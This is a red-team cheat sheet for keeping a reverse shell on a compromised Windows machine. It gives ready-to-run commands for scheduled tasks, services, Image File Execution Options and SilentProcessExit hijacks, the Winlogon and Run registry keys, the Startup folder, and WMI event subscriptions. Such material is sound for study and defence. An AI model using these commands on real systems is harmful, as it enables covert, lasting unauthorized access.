# Windows Persistence CheatSheet

## Introduction
Introducing a new article featuring a CheatSheet for achieving persistence in Windows systems. We'll explore various methods to accomplish this and conclude with a custom C++ tool I developed to automate the process.

## What is persistence?

[Windows Red Team Persistence Techniques\
This guide is part of the HackerSploit Red Team series of guides.](https://www.linode.com/docs/guides/windows-red-team-persistence-techniques/)

Persistence involves methods adversaries employ to **maintain access** to systems despite restarts, credential changes, or other disruptions that might terminate their access. These methods encompass any access, action, 
or configuration modifications that enable them to sustain their presence, such as substituting or manipulating legitimate code or inserting startup code.

In simpler terms, persistence lets you keep **access** or continue **controlling** a target computer whenever you want, even after it’s been turned off and on again, without needing to reinfect the device to regain your shell.

## Index
- Scheduled Tasks
- Services
- Close App
- Open App
- WinLogon
- Run Register
- Startup Folder
- WMIC

## POC

### Scheduled Tasks:
Using scheduled tasks is one of the easiest methods to maintain persistence. Although it's more likely to be detected by users, most average users typically don't notice it.

To create this i need to use **schtasks**:

![image](https://github.com/user-attachments/assets/6fe261c1-1044-4032-8560-3b0cd25812b5)

To create new task:

```bash
schtasks /CREATE /SC MINUTE /TN "Reverse Shell" /TR "C:\Users\s12de\Downloads\shell.exe"
```

![image](https://github.com/user-attachments/assets/df4fa1d5-e0be-4923-84b4-4f0feb1fe5e4)

![image](https://github.com/user-attachments/assets/63d7d360-7884-4be3-bebd-1d6e41c9fcb2)

### Services:

[What is a Windows Service? - Definition from Techopedia\
A Windows service is an application that usually serves a core operating system function running in the background.](https://www.techopedia.com/definition/13530/windows-service)

Windows services are essential parts of the operating system, responsible for handling tasks like memory, device management, user credentials, preferences, and third-party applications. They function similarly to Unix daemons.

#### POC:

To start we need powershell instance:

![image](https://github.com/user-attachments/assets/7586635b-eaee-4211-8b00-185efdd52a89)

A new service is created with an **automatic** startup type, configured to execute the binary specified in the `BinaryPathName` field.

```bash
New-Service -Name "s12" -BinaryPathName "C:\Users\s12de\Downloads\shell.exe" -Description "PersistenceWindows" -StartupType Automatic
```

![image](https://github.com/user-attachments/assets/5d1056c5-3aa3-4f2b-8183-c425b9527089)

And now start the service:

```bash
sc start s12
```

![image](https://github.com/user-attachments/assets/40f8fb8c-5404-4f9e-9185-00fb6bf17cc8)

![image](https://github.com/user-attachments/assets/ccf0dfba-2f3c-4130-89d7-f34104cb2f56)

### Close App:

This next method is my favorite — it allows your binary to execute whenever a specific process or binary is closed. In this example, a reverse shell is triggered when the user terminates the `notepad.exe` process.

To do this we need to execute 3 commands in cmd:

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
```

![image](https://github.com/user-attachments/assets/d8573bc4-dcaa-4188-801d-8863fdaa3a54)

</br>

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
```

![image](https://github.com/user-attachments/assets/72e6c5cb-db85-4874-ba41-3db7485d717c)

</br>

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Users\s12de\Downloads\shell.exe"
```

![image](https://github.com/user-attachments/assets/2443efac-4901-4516-abb1-3b987b858963)

Result:

When i close notepad automatically i receive the reverse shell

![image](https://github.com/user-attachments/assets/7d6e5742-79a8-4816-9d46-515529c75873)


### Open App:

This next method is my second favorite — it allows your binary to execute whenever a specific process or binary is launched. In this case, a reverse shell is triggered when the user opens the `calc.exe` process.

To do this we need to execute 2 commands in cmd:

```bash
copy calc.exe _calc.exe
```

![image](https://github.com/user-attachments/assets/7c962d0d-a191-46de-a71c-162a3de9bf90)

</br>

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & C:\Users\s12de\Downloads\shell.exe /f
```

![image](https://github.com/user-attachments/assets/c84e019a-23b6-42b6-ba2e-82520b9836bd)

Result:

When user open calculator i receive reverse shell connection.



### WinLogon:

[Persistence — Winlogon Helper DLL\
Winlogon is a Windows component which handles various activities such as the Logon, Logoff, loading user profile during](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)

Winlogon is a core Windows component responsible for handling actions like logon, logoff, user profile loading during authentication, shutdown, and the lock screen. These behaviors are controlled through the registry, 
which specifies processes to launch during the logon sequence. From a red team perspective, these events present an opportunity to trigger arbitrary payloads for persistence.

```bash
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
```

![image](https://github.com/user-attachments/assets/8e192716-d6a2-4e85-94a0-418c33bd83a2)

Now, create a new registry query that executes your `shell.exe` each time the user logs in, logs out, or locks the screen.

```bash
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, C:\Users\s12de\Downloads\shell.exe" /f
```

![image](https://github.com/user-attachments/assets/13e0a9ec-178c-44a4-9ba0-6d5f10c71664)

Result:

Register Key are modified!

![image](https://github.com/user-attachments/assets/c37aaab5-1069-40f2-b0ac-12bd992c1172)

![image](https://github.com/user-attachments/assets/e186a329-2c44-4b38-b6b6-dbd1eb0a5469)



### Run Register:

The Windows Registry is a hierarchical database essential to the functioning of the operating system, as well as the applications and services running on it. 
Structured like a tree, **each node is referred to as a 'key'**, which can hold both subkeys and data entries known as 'values'.

#### POC:

In this case, it's time to use the Run registry key — one of the most significant keys in the Windows system. The advantage here is that you don't need **administrator privileges** to execute your binary using this method.

```bash
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v S12 /t REG_SZ /d "C:\Users\s12de\Downloads\shell.exe"
```

![image](https://github.com/user-attachments/assets/1077a02f-e31f-4d9e-bea5-b62860698b4f)

Result:

![image](https://github.com/user-attachments/assets/e960fd76-56c2-44ec-a4ff-5894ccebff41)



### Startup Folder:

After a reboot or user logon, the Windows operating system executes executable files located in the Startup folder. Typically, these files include the following:

```bash
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

In this case, you only need to run a single command, which simply copies the malicious binary to this path:

```bash
copy "shell.exe" "C:\Users\s12de\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"
```

![image](https://github.com/user-attachments/assets/95993ebd-be52-4548-ae73-6db0b214f30d)

![image](https://github.com/user-attachments/assets/49304596-dea0-43eb-baf5-1b26b66b33b3)



### WMIC:

[Persistence - WMI Event Subscription
Windows Management Instrumentation (WMI) enables system administrators to perform tasks locally and remotely.](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)

Windows Management Instrumentation (WMI) allows system administrators to manage tasks both locally and remotely. From a red team perspective, WMI can be leveraged for various activities such as lateral movement, persistence, situational awareness, code execution, and even as a [command and control](https://pentestlab.blog/2017/11/20/command-and-control-wmi/) (C2) mechanism. 
Since WMI is a built-in component present in nearly all Windows operating systems (from Windows 98 to Windows 10), it enables these offensive actions to remain under the radar of blue team defenses.

The executable will initiate a reverse shell session within 60 seconds of each reboot.

In this case i need to execute 3 commands:

```bash
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

![image](https://github.com/user-attachments/assets/701b87a8-5abb-4c3a-ab86-109daf01e655)

</br>

```bash
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\windows\system32\tita.exe",CommandLineTemplate="C:\Users\s12de\Downloads\shell.exe"
```

![image](https://github.com/user-attachments/assets/ba34fe6a-ad76-46c1-b052-1d45b3d3df0d)

</br>

```bash
wmic /NAMESPACE:"\\root\subscription" PATH  __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""
```

![image](https://github.com/user-attachments/assets/fd9b7a6b-5031-4d07-adbd-2540598d87b9)


## Conclusions

That concludes today’s article. I believe this cheat sheet will be highly useful, and I'm also developing a C++ tool to automate the entire process. Stay tuned to my GitHub for updates. 

Thanks for reading! 😊

**-Malforge Group.**
